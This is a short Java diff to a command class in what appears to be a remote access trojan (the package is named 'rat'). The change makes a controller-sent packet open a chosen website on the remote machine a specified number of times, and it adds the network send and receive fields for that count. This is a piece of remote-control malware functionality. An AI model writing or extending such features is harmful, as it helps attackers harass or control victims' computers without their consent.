@@ -11,10 +11,13 @@ import de.sogomn.rat.ActiveConnection;
 public final class WebsitePacket implements IPacket {
 	
 	private String address;
+	private int amount;
 	
 	private static final String HTTP_PREFIX = "http://";
 	
-	public WebsitePacket(final String address) {
+	public WebsitePacket(final String address, final int amount) {
+		this.amount = amount;
+		
 		final boolean hasPrefix = address.startsWith(HTTP_PREFIX);
 		
 		if (hasPrefix) {
@@ -24,22 +27,15 @@ public final class WebsitePacket implements IPacket {
 		}
 	}
 	
+	public WebsitePacket(final String address) {
+		this(address, 1);
+	}
+	
 	public WebsitePacket() {
 		this("");
 	}
 	
-	@Override
-	public void send(final ActiveConnection connection) {
-		connection.writeUTF(address);
-	}
-	
-	@Override
-	public void receive(final ActiveConnection connection) {
-		address = connection.readUTF();
-	}
-	
-	@Override
-	public void execute(final ActiveConnection connection) {
+	private void openWebsite(final String address) {
 		final boolean desktopSupported = Desktop.isDesktopSupported();
 		
 		if (desktopSupported) {
@@ -55,6 +51,25 @@ public final class WebsitePacket implements IPacket {
 					ex.printStackTrace();
 				}
 			}
+		}
+	}
+	
+	@Override
+	public void send(final ActiveConnection connection) {
+		connection.writeUTF(address);
+		connection.writeInt(amount);
+	}
+	
+	@Override
+	public void receive(final ActiveConnection connection) {
+		address = connection.readUTF();
+		amount = connection.readInt();
+	}
+	
+	@Override
+	public void execute(final ActiveConnection connection) {
+		for (int i = 0; i < amount; i++) {
+			openWebsite(address);
 		}
 	}
 	
